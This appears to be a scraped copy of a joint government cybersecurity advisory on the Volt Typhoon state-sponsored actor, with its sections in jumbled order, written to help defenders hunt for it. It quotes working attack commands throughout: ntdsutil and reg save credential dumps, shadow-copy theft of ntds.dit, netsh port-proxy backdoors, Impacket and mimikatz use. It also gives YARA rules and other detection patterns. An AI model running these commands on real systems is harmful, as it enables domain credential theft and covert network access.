7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z c:\windows\temp\*""C:\pstools\psexec.exe"" \\{REDACTED} -s cmd /c ""cmd.exe /c ""netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999""""C:\Windows\system32\pcwrun.exe C:\Users\Administrator\Desktop\Win.execmd.exe /C dir /S \\{REDACTED}\c$\Users\{REDACTED} >> c:\windows\temp\{REDACTED}.tmp""cmd.exe"" /c wmic process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\""cmd.exe /Q /c *cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1652470932.9400265 2>&1cmd.exe /Q /c net group ""domain admins"" /dom 1>\\127.0.0.1\ADMIN$\__<timestamp value> 2>&1 cmd.exe /Q /c wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\""  1> \\127.0.0.1\ADMIN$\<timestamp value>  2>&1D:\{REDACTED}\xcopy C:\windows\temp\hp d:\{REDACTED} Get-EventLog security -instanceid 4624ldifde.exe -f c:\windows\temp\cisco_up.txt -p subtreemakecab ..\backup\210829-020000.zip ..\webapps\adssp\html\Lock.licmove ""\\<redacted>\c$\users\public\Appfile\registry\SYSTEM"" ..\backup\210829-020000.zipnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress={REDACTED} connectport=8443 protocol=tcpnetsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999Rar.exe a –{REDACTED} c:\Windows\temp\DMBC2C61.tmpstart-process -filepath c:\windows\temp\<filename>.bat -windowstyle hidden 1
Note: The batch file in question (<filename>.bat) could use any name, and no discernable pattern has been determined at this time.
wmic process call create ""cmd.exe /c mkdir C:\users\public\Appfile & ntdsutil \""ac i ntds\"" ifm \""create full C:\users\public\Appfile\"" q qwmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\""wmic process call create ""cmd.exe /c ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""wmic process call create ""ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\""
Command Line Patterns
Certain patterns in commands (with asterisks for wildcards) can be used to identify potentially malicious commands:

cmd.exe /C dir /S \\* >> *
cmd.exe /Q /c * 1> \\127.0.0.1\ADMIN$\__*.*>&1
powershell start-process -filepath c:\windows\temp\*.exe -windowstyle hidden

File Paths
The most common paths where files and executables used by the actor have been found include:

C:\Users\Public\Appfile (including subdirectories)
C:\Perflogs (including subdirectories)
C:\Windows\Temp (including subdirectories)

File Names
The file names the actor has previously used for such things as malware, scripts, and tools include:



backup.bat
cl64.exe
update.bat
Win.exe


billagent.exe
nc.exe
update.exe
WmiPrvSE.exe


billaudit.exe
rar.exe
vm3dservice.exe
WmiPreSV.exe


cisco_up.exe
SMSvcService.exe
watchdogd.exe
 



In addition to the file names and paths above, malicious files names, believed to be randomly created, in the following format have also been discovered: C:\Windows\[a-zA-Z]{8}.exe
SHA-256 File Hashes

f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd
ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31
d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca
472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d
66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7
3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71
41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597
c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99
3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f
fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15
ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484

User-agent
In some cases, the following user-agent string (including the extra spacing) was identified performing reconnaissance activities by this actor:
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)               Gecko/20100101 Firefox/68.0
Note: The spacing between “)” and “Gecko” is 3 tabs followed by 4 spaces.
Yara rules



rule ShellJSP {strings:$s1 = ""decrypt(fpath)""$s2 = ""decrypt(fcontext)""$s3 = ""decrypt(commandEnc)""$s4 = ""upload failed!""$s5 = ""aes.encrypt(allStr)""$s6 = ""newid""condition:filesize < 50KB and 4 of them}






rule EncryptJSP {strings:$s1 = ""AEScrypt""$s2 = ""AES/CBC/PKCS5Padding""$s3 = ""SecretKeySpec""$s4 = ""FileOutputStream""$s5 = ""getParameter""$s6 = ""new ProcessBuilder""$s7 = ""new BufferedReader""$s8 = ""readLine()""condition:filesize < 50KB and 6 of them}






rule CustomFRPClient {meta:description=”Identify instances of the actor's custom FRP tool basedon unique strings chosen by the actor and included in the tool”strings:$s1 = ""%!PS-Adobe-"" nocase ascii wide$s2 = ""github.com/fatedier/frp/cmd/frpc"" nocase ascii wide$s3 = ""github.com/fatedier/frp/cmd/frpc/sub.startService"" nocaseascii wide$s4 = ""MAGA2024!!!"" nocase ascii wide$s5 = ""HTTP_PROXYHost: %s"" nocase ascii widecondition:all of them}






rule HACKTOOL_FRPClient {meta:description=”Identify instances of FRP tool (Note: This tool isknown to be used by multiple actors, so hits would not necessarily implyactivity by the specific actor described in this report)”strings:$s1 = ""%!PS-Adobe-"" nocase ascii wide$s2 = ""github.com/fatedier/frp/cmd/frpc"" nocase ascii wide$s3 = ""github.com/fatedier/frp/cmd/frpc/sub.startService"" nocaseascii wide$s4 = ""HTTP_PROXYHost: %s"" nocase ascii widecondition:3 of them}



References
Active Directory and domain controller hardening:

Best practices: Best Practices for Securing Active Directory | Microsoft Learn.

CISA regional cyber threats:

PRC state-sponsored activity: China Cyber Threat Overview and Advisories.

Microsoft Threat Intelligence blog:

Volt Typhoon activity: Volt Typhoon targets US critical infrastructure with living-off-the-land techniques | Microsoft Security Blog.

Ntdsutil.exe:

Overview: Ntdsutil | Microsoft Learn.

PowerShell:

Best practices: Keeping PowerShell: Security Measures to Use and Embrace.
Logging configuration: Greater Visibility Through PowerShell Logging | Mandiant | Google Cloud Blog.

Windows command line process auditing:

Overview: Command line process auditing | Microsoft Learn.

Windows Defender Firewall:

Best practices: Configure firewall rules with group policy - Windows Security | Microsoft Learn.
Logging configuration: Configure Windows Firewall logging - Windows Security | Microsoft Learn.

Windows management instrumentation:

Events: Tracing WMI Activity - Win32 apps | Microsoft Learn.
Tracing activity: Tracing WMI Activity - Win32 apps | Microsoft Learn

Windows password spraying:

Logging and playbook configuration: Password spray investigation | Microsoft Learn.

Acknowledgements
The NSA Cybersecurity Collaboration Center, along with the authoring agencies, acknowledge Amazon Web Services (AWS) Security, Broadcom, Cisco Talos, Google's Threat Analysis Group, Lumen Technologies, Mandiant, Microsoft Threat Intelligence (MSTI), Palo Alto Networks, SecureWorks, SentinelOne, Trellix, and additional industry partners for their collaboration on this advisory.
Disclaimer of Endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise does not constitute or imply its endorsement, recommendation, or favoring by the authoring agencies' governments, and this guidance shall not be used for advertising or product endorsement purposes.
Trademark Recognition
Active Directory®, Microsoft®, PowerShell®, and Windows® are registered trademarks of Microsoft Corporation. MITRE® and ATT&CK® are registered trademarks of The MITRE Corporation.
Purpose
This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.
Contact
U.S. organizations: Urgently report any anomalous activity or incidents, including based upon technical information associated with this Cybersecurity Advisory, to CISA at Report@cisa.dhs.gov or cisa.gov/report or to the FBI via your local FBI field office listed at https://www.fbi.gov/contact-us/field-offices.  
NSA Cybersecurity Report Questions and Feedback: CybersecurityReports@nsa.gov
NSA Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
NSA Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov
Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and to access alerts and advisories.
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.
New Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or call 04 498 7654.
United Kingdom organizations: Report a significant cyber security incident at ncsc.gov.uk/report-an-incident (monitored 24 hours) or, for urgent assistance, call 03000 200 973.
Appendix: MITRE ATT&CK Techniques
The below tables capture all referenced threat actor tactics and techniques in this advisory.



Initial Access
 
 


Technique Title
ID
Use




Exploit Public-facing Application
T1190
Actor used public-facing applications to gain initial access to systems; in this case, Earthworm and PortProxy.






Execution
 
 


Technique Title
ID
Use




Windows Management Instrumentation
T1047
The actor executed WMIC commands to create a copy of the SYSTEM registry.


Command and Scripting Interpreter: PowerShell
T1059.001
The actor used a PowerShell command to identify successful logons to the host.


Command and Scripting Interpreter: Windows Command Shell
T1059.003
The actor used this primary command prompt to execute a query that collected information about the storage devices on the local host.






Persistence
 
 


Technique Title
ID
Use




Server Software Component: Web Shell
T1505.003
The actor used backdoor web servers with web shells to establish persistence to systems, including some of the webshells being derived from Awen webshell.






Defense Evasion
 
 


Technique Title
ID
Use




Indicator Removal
T1070
The actor selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity.


Indicator Removal: Clear Windows Event Logs
T1070.001
The actor cleared system event logs to hide activity of an intrusion.






Credential Access
 
 


Technique Title
ID
Use




OS Credential Dumping: NTDS
T1003.003
The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive out of the network to perform password cracking.


Brute Force
T1110
The actor attempted to gain access to accounts with multiple password attempts.


Brute Force: Password Spraying
T1110.003
The actor used commonly used passwords against accounts to attempt to acquire valid credentials.


OS Credential Dumping
T1003
The actor used additional commands to obtain credentials in the environment.


Credentials from Password Stores
T1555
The actors searched for common password storage locations.






Discovery
 
 


Technique Title
ID
Use




System Information Discovery
T1082
The actors executed commands to gather information about local drives.


System Owner/User Discovery
T1033
The actors gathered information about successful logons to the host using a PowerShell command.


Permission Groups Discovery: Local Groups
T1069.001
The actors attempt to find local system groups and permission settings.


Permission Groups Discovery: Doman Groups
T1069.002
The actors used commands to enumerate the active directory structure.


System Network Configuration Discovery
T1016
The actors used commands to enumerate the network topology.






Command and Control
 
 


Technique Title
ID
Use




Proxy
T1090
The actors used commands to enable port forwarding on the host.


Proxy: External Proxy
T1090.002
The actors used compromised SOHO devices (e.g. routers) to obfuscate the source of their activity.



 
 






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1090.002', 'T1505.003', 'T1555', 'T1016', 'T1190', 'T1069.002', 'T1110', 'T1069.001', 'T1082', 'T1110.003', 'T1003', 'T1090', 'T1070', 'T1059.001', 'T1033', 'T1003.003', 'T1047', 'T1059.003', 'T1070.001'}","



Summary
The United States and international cybersecurity authorities are issuing this joint Cybersecurity Advisory (CSA) to highlight a recently discovered cluster of activity of interest associated with a People’s Republic of China (PRC) state-sponsored cyber actor, also known as Volt Typhoon. Private sector partners have identified that this activity affects networks across U.S. critical infrastructure sectors, and the authoring agencies believe the actor could apply the same techniques against these and other sectors worldwide.
This advisory from the United States National Security Agency (NSA), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Federal Bureau of Investigation (FBI), the Australian Signals Directorate’s Australian Cyber Security Centre (ACSC), the Communications Security Establishment’s Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NCSC-NZ), and the United Kingdom National Cyber Security Centre (NCSC-UK) (hereafter referred to as the “authoring agencies”) provides an overview of hunting guidance and associated best practices to detect this activity.
One of the actor’s primary tactics, techniques, and procedures (TTPs) is living off the land, which uses built-in network administration tools to perform their objectives. This TTP allows the actor to evade detection by blending in with normal Windows system and network activities, avoid endpoint detection and response (EDR) products that would alert on the introduction of third-party applications to the host, and limit the amount of activity that is captured in default logging configurations. Some of the built-in tools this actor uses are: wmic, ntdsutil, netsh, and PowerShell. The advisory provides examples of the actor’s commands along with detection signatures to aid network defenders in hunting for this activity. Many of the behavioral indicators included can also be legitimate system administration commands that appear in benign activity. Care should be taken not to assume that findings are malicious without further investigation or other indications of compromise.
Download the PDF version of this report (723 KB).
Download the Spanish version of this report (479.18 KB).
For a downloadable copy of IOCs, see


People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection
(XML,       34.57 KB
  )




People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection - Spanish
(PDF,       479.18 KB
  )


For a downloadable copy of IOCs in JSON format, see AA23-144A.stix.json.
Technical Details
This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the Appendix: MITRE ATT&CK Techniques for all referenced tactics and techniques.
Background
The authoring agencies are aware of recent People’s Republic of China (PRC) state-sponsored cyber activity and have identified potential indicators associated with these techniques. This advisory will help net defenders hunt for this activity on their systems. It provides many network and host artifacts associated with the activity occurring after the network has been initially compromised, with a focus on command lines used by the cyber actor. An Indicators of compromise (IOCs) summary is included at the end of this advisory.
Especially for living off the land techniques, it is possible that some command lines might appear on a system as the result of benign activity and would be false positive indicators of malicious activity. Defenders must evaluate matches to determine their significance, applying their knowledge of the system and baseline behavior. Additionally, if creating detection logic based on these commands, network defenders should account for variability in command string arguments, as items such as ports used may differ across environments.
Artifacts
Network Artifacts
The actor has leveraged compromised small office/home office (SOHO) network devices as intermediate infrastructure to obscure their activity by having much of the command and control (C2) traffic emanate from local ISPs in the geographic area of the victim. Owners of SOHO devices should ensure that network management interfaces are not exposed to the Internet to avoid them being re-purposed as redirectors by malicious actors. If they must be exposed to the Internet, device owners and operators should ensure they follow zero trust principles and maintain the highest level of authentication and access controls possible.
The actor has used Earthworm and a custom Fast Reverse Proxy (FRP) client with hardcoded C2 callbacks, to ports 8080, 8443, 8043, 8000, and 10443 with various filenames including, but not limited to: cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe.
Host Artifacts
Windows Management Instrumentation (WMI/WMIC)
The actor has executed the following command to gather information about local drives,:
cmd.exe /C ""wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename""
This command does not require administrative credentials to return results. The command uses a command prompt, to execute a Windows Management Instrumentation Command Line (WMIC) query, collecting information about the storage devices on the local host, including drive letter, file system (e.g., new technology file system,NTFS,), free space and drive size in bytes, and an optional volume name. Windows Management Instrumentation (WMI) is a built-in Windows tool that allows a user to access management information from hosts in an enterprise environment. The command line version of WMI is called WMIC.
By default, WMI Tracing is not enabled, so the WMI commands being executed and the associated user might not be available. Additional information on WMI events and tracing can be found in the References section of the advisory.
Ntds.dit Active Directory Database
The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from Windows domain controllers (DCs) out of the network to perform password cracking,. (The ntds.dit file is the main Active Directory (AD) database file and, by default, is stored at %SystemRoot%\NTDS\ntds.dit. This file contains information about users, groups, group memberships, and password hashes for all users in the domain; the SYSTEM registry hive contains the boot key that is used to encrypt information in the ntds.dit file.) Although the ntds.dit file is locked while in use by AD, a copy can be made by creating a Volume Shadow Copy and extracting the ntds.dit file from the Shadow Copy. The SYSTEM registry hive may also be obtained from the Shadow Copy. The following example commands show the actor creating a Shadow Copy and then extracting a copy of the ntds.dit file from it.
cmd /c vssadmin create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp
The built-in Ntdsutil.exe tool performs all these actions using a single command. There are several ways to execute Ntdsutil.exe, including running from an elevated command prompt (cmd.exe), using WMI/WMIC, or PowerShell. Defenders should look for the execution of Ntdsutil.exe commands using long, short, or a combination of the notations. For example, the long notation command activate instance ntds ifm can also be executed using the short notation ac i ntds i. Table 1 provides the long and short forms of the arguments used in the sample Ntdsutil.exe command, along with a brief description of the arguments.

The actor has executed WMIC commands, to create a copy of the ntds.dit file and SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is a standalone example; multiple examples are provided to show how syntax and file paths may differ per environment.
wmic process call create ""ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\pro
wmic process call create ""cmd.exe /c ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""
wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\""
""cmd.exe"" /c wmic process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\""
cmd.exe /Q /c wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\"" 1> \\127.0.0.1\ADMIN$\ 2>&1
Note: The <timestamp value> would be an epoch timestamp following the format like “__1684956600.123456”.
Each actor command above creates a copy of the ntds.dit database and the SYSTEM and SECURITY registry hives in the C:\Windows\Temp\<folder> directory, where <folder> is replaced with the path specified in the command (e.g., pro, tmp, or McAfee_Logs). By default, the hidden ADMIN$ share is mapped to C:\Windows\, so the last command will direct standard output and error messages from the command to a file within the folder specified.
The actor has also saved the files directly to the C:\Windows\Temp and C:\Users\Public directories, so the entirety of those directory structures should be analyzed. Ntdsutil.exe creates two subfolders in the directory specified in the command: an Active Directory folder that contains the ntds.dit and ntds.jfm files, and a registry folder that contains the SYSTEM and SECURITY hives. Defenders should look for this folder structure across their network:
<path specified in command>\Active Directory\ntds.dit
<path specified in command>\Active Directory\ntds.jfm
<path specified in command>\registry\SECURITY
<path specified in command>\registry\SYSTEM
When one of the example commands is executed, several successive log entries are created in the Application log, under the ESENT Source. Associated events can be viewed in Windows Event Viewer by navigating to: Windows Logs | Application. To narrow results to relevant events, select Filter Current Log from the Actions menu on the right side of the screen. In the Event sources dropdown, check the box next to ESENT, then limit the logs to ID numbers 216, 325, 326, and 327. Clicking the OK box will apply the filters to the results.
Since ESENT logging is used extensively throughout Windows, defenders should focus on events that reference ntds.dit. If such events are present, the events’ details should contain the file path where the file copies were created. Since these files can be deleted, or enhanced logging may not be configured on hosts, the file path can greatly aid in a hunt operation. Identifying the user associated with this activity is also a critical step in a hunt operation as other actions by the compromised—or actor-created—user account can be helpful to understand additional actor TTPs, as well as the breadth of the actor's actions.
Note: If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain should be considered compromised, as the actor will generally be able to crack the password hashes for domain user accounts, create their own accounts, and/or join unauthorized systems to the domain. If this occurs, defenders should follow guidance for removing malicious actors from victim networks, such as CISA's Eviction Guidance for Network Affected by the SolarWinds and Active Directory/M365 Compromise.
In addition to the above TTPs used by the actor to copy the ntds.dit file, the following tools could be used by an actor to obtain the same information:

Secretsdump.py

Note: This script is a component of Impacket, which the actor has been known to use


Invoke-NinjaCopy (PowerShell)
DSInternals (PowerShell)
FgDump
Metasploit

Best practices for securing ntds.dit include hardening Domain Controllers and monitoring event logs for ntdsutil.exe and similar process creations. Additionally, any use of administrator privileges should be audited and validated to confirm the legitimacy of executed commands.
PortProxy
The actor has used the following commands to enable port forwarding, on the host:
""cmd.exe /c ""netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp""""
""cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=""
where <rfc1918 internal ip address> is replaced with an IPv4 address internal to the network, omitting the < >’s.
Netsh is a built-in Windows command line scripting utility that can display or modify the network settings of a host, including the Windows Firewall. The portproxy add command is used to create a host:port proxy that will forward incoming connections on the provided listenaddress and listenport to the connectaddress and connectport. Administrative privileges are required to execute the portproxy command. Each portproxy command above will create a registry key in the HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\ path. Defenders should look for the presences of keys in this path and investigate any anomalous entries.
Note: Using port proxies is not common for legitimate system administration since they can constitute a backdoor into the network that bypasses firewall policies. Administrators should limit port proxy usage within environments and only enable them for the period of time in which they are required.
Defenders should also use unusual IP addresses and ports in the command lines or registry entries to identify other hosts that are potentially included in actor actions. All hosts on the network should be examined for new and unusual firewall and port forwarding rules, as well as IP addresses and ports specified by the actor. If network traffic or logging is available, defenders should attempt to identify what traffic was forwarded though the port proxies to aid in the hunt operation. As previously mentioned, identifying the associated user account that made the networking changes can also aid in the hunt operation.
Firewall rule additions and changes can be viewed in Windows Event Viewer by navigating to: Applications and Service Logs | Microsoft | Windows | Windows Firewall With Advanced Security | Firewall.
In addition to host-level changes, defenders should review perimeter firewall configurations for unauthorized changes and/or entries that may permit external connections to internal hosts. The actor is known to target perimeter devices in their operations. Firewall logs should be reviewed for any connections to systems on the ports listed in any portproxy commands discovered.
PowerShell
The actor has used the following PowerShell, command to identify successful logons to the host,:
Get-EventLog security -instanceid 4624
Note: Event ID 4624 is logged when a user successfully logs on to a host and contains useful information such as the logon type (e.g., interactive or networking), associated user and computer account names, and the logon time. Event ID 4624 entries can be viewed in Windows Event Viewer by navigating to: Windows Logs | Security. PowerShell logs can be viewed in Event Viewer: Applications and Service Logs | Windows PowerShell.
This command identifies what user account they are currently leveraging to access the network, identify other users logged on to the host, or identify how their actions are being logged. If the actor is using a password spray technique, there may be several failed logon (Event ID 4625) events for several different user accounts, followed by one or more successful logons (Event ID 4624) within a short period of time. This period may vary by actor but can range from a few seconds to a few minutes.
If the actor is using brute force password attempts, against a single user account, there may be several Event ID 4625 entries for that account, followed by a successful logon Event ID 4624. Defenders should also look for abnormal account activity, such as logons outside of normal working hours and impossible time-and-distance logons (e.g., a user logging on from two geographically separated locations at the same time).
Impacket
The actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file within the victim host's ADMIN$ share (C:\Windows\) containing an epoch timestamp in its name. The following is an example of the ""dir"" command being executed by wmiexec.py:
cmd.exe /Q /c *dir 1> \\127.0.0.1\ADMIN$\__1684956600.123456 2>&1
Note: Discovery of an entry similar to the example above in the Windows Event Log and/or a file with a name in a similar format may be evidence of malicious activity and should be investigated further. In the event that only a filename is discovered, the epoch timestamp within the filename reflects the time of execution by default and can be used to help scope threat hunting activities.
Enumeration of the Environment
The following commands were used by the actor to enumerate the network topology, the active directory structure, and other information about the target environment,:
arp -acurl www.ip-api,.,comdnscmd . /enumrecords /zone {REDACTED}dnscmd . /enumzonesdnscmd /enumrecords {REDACTED} . /additionalipconfig /allldifde.exe -f c:\windows\temp\<filename>.txt -p subtreenet localgroup administratorsnet group /dom net group ""Domain Admins"" /domnetsh interface firewall show allnetsh interface portproxy show allnetsh interface portproxy show v4tov4netsh firewall show allnetsh portproxy show v4tov4netstat -anoreg query hklm\software\systeminfotasklist /vwhoamiwmic volume list briefwmic service briefwmic product list briefwmic baseboard list fullwevtutil qe security /rd:true /f:text /q:*,System,(EventID=4624) and TimeCreated,@SystemTime>='{REDACTED}', and EventData,Data='{REDACTED}',
Additional Credential Theft
The actor also used the following commands to identify additional opportunities for obtaining credentials in the environment,:
dir C:\Users\{REDACTED}\.ssh\known_hostsdir C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profilesmimikatz.exereg query hklm\software\OpenSSHreg query hklm\software\OpenSSH\Agentreg query hklm\software\realvncreg query hklm\software\realvnc\vncserverreg query hklm\software\realvnc\Allusersreg query hklm\software\realvnc\Allusers\vncserverreg query hkcu\software\{REDACTED}\putty\sessionreg save hklm\sam ss.datreg save hklm\system sy.dat
Additional Commands
The actor executed the following additional commands:
7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7zC:\Windows\system32\pcwrun.exeC:\Users\Administrator\Desktop\Win.exeC:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log""cmd.exe"" /c dir \\127.0.0.1\C$ /od""cmd.exe"" /c ping –a –n 1 <IP address>""cmd.exe"" /c wmic /user:<username> /password:<password> process call create ""net stop \""<service name>\"" > C:\Windows\Temp\tmp.log""cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1net use \\127.0.0.1\IPC$ /y /dpowershell start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hiddenrar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd /c whoamixcopy C:\windows\temp\hp d:\{REDACTED}
Mitigations
The authoring agencies recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of the threat actor’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity Frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Defenders should harden domain controllers and monitor event logs,2.T, for ntdsutil.exe and similar process creations. Additionally, any use of administrator privileges should be audited and validated to confirm the legitimacy of executed commands.
Administrators should limit port proxy usage within environments and only enable them for the period of time in which they are required,2.X,.
Defenders should investigate unusual IP addresses and ports in command lines, registry entries, and firewall logs to identify other hosts that are potentially involved in actor actions.
In addition to host-level changes, defenders should review perimeter firewall configurations for unauthorized changes and/or entries that may permit external connections to internal hosts.
Defenders should also look for abnormal account activity, such as logons outside of normal working hours and impossible time-and-distance logons (e.g., a user logging on from two geographically separated locations at the same time).
Defenders should forward log files to a hardened centralized logging server, preferably on a segmented network,2.F,.

Logging Recommendations
To be able to detect the activity described in this CSA, defenders should set the audit policy for Windows security logs to include “audit process creation” and “include command line in process creation events” in addition to accessing the logs. Otherwise, the default logging configurations may not contain the necessary information.
Enabling these options will create Event ID 4688 entries in the Windows Security log to view command line processes. Given the cost and difficulty of logging and analyzing this kind of activity, if an organization must limit the requirements, they should focus on enabling this kind of logging on systems that are externally facing or perform authentication or authorization, especially including domain controllers.
To hunt for the malicious WMI and PowerShell activity, defenders should also log WMI and PowerShell events. By default, WMI Tracing and deep PowerShell logging are not enabled, but they can be enabled by following the configuration instructions linked in the References section.
The actor takes measures to hide their tracks, such as clearing logs,. To ensure log integrity and availability, defenders should forward log files to a hardened centralized logging server, preferably on a segmented network. Such an architecture makes it harder for an actor to cover their tracks as evidence of their actions will be captured in multiple locations.
Defenders should also monitor logs for Event ID 1102, which is generated when the audit log is cleared. All Event ID 1102 entries should be investigated as logs are generally not cleared and this is a known actor tactic to cover their tracks. Even if an event log is cleared on a host, if the logs are also stored on a logging server, the copy of the log will be preserved.
This activity is often linked to malicious exploitation of edge devices and network management devices. Defenders should enable logging on their edge devices, to include system logs, to be able to identify potential exploitation and lateral movement. They should also enable network-level logging, such as sysmon, webserver, middleware, and network device logs.
Indicators of Compromise (IOCs) Summary
Indicators of Compromise (IOCs) Summary
TTPs

Exploiting vulnerabilities, in widely used software including, but not limited to:

CVE-2021-40539—ManageEngine ADSelfService Plus.

APT Actors Exploiting Newly Identified Vulnerability in ManageEngine ADSelfService Plus.


CVE-2021-27860—FatPipe WARP, IPVPN, MPVPN.

An APT Group Exploiting a 0-day in FatPipe WARP,MPVPN, and IPVPN Software.




Using webshells for persistence and exfiltration, with at least some of the webshells derived from the Awen webshell.
Using compromised Small-Office Home-Office (SOHO) devices (e.g. routers) to obfuscate the source of the activity,.

Most common types include ASUS, Cisco RV, Draytek Vigor, FatPipe IPVPN/MPVPN/WARP, Fortinet Fortigate, Netgear Prosafe, and Zyxel USG devices.
Common CVEs for these devices and mitigation guidance can be found in the joint Cybersecurity Advisory, Top CVEs Actively Exploited by People’s Republic of China State-Sponsored Cyber Actors.


Using living off the land tools for discovery, lateral movement, and collection activities, to include:

certutil
dnscmd
ldifde
makecab
net user/group/use
netsh
nltest
ntdsutil
PowerShell
req query/save
systeminfo
tasklist
wevtutil
wmic
xcopy


Selective clearing of Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity,.
Using open source “hacktools” tools, such as:

Fast Reverse Proxy (frp)

Probably derived from the publicly-available fatedier and EarthWorm variants.


Impacket

To detect Impacket usage, see the joint Cybersecurity Advisory: Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.


Mimikatz.exe
Remote administration tools

Defenders should consult the joint Cybersecurity Advisory: Protecting Against Malicious Use of Remote Monitoring and Management Software.





Command Execution
File names and directory paths used in these commands are only meant to serve as examples. Actual names and paths may differ depending on environment and activity, so defenders should account for variants when performing queries.
Note: Many of the commands are derivatives of common system administration commands that could generate false positives when used alone without additional indicators.
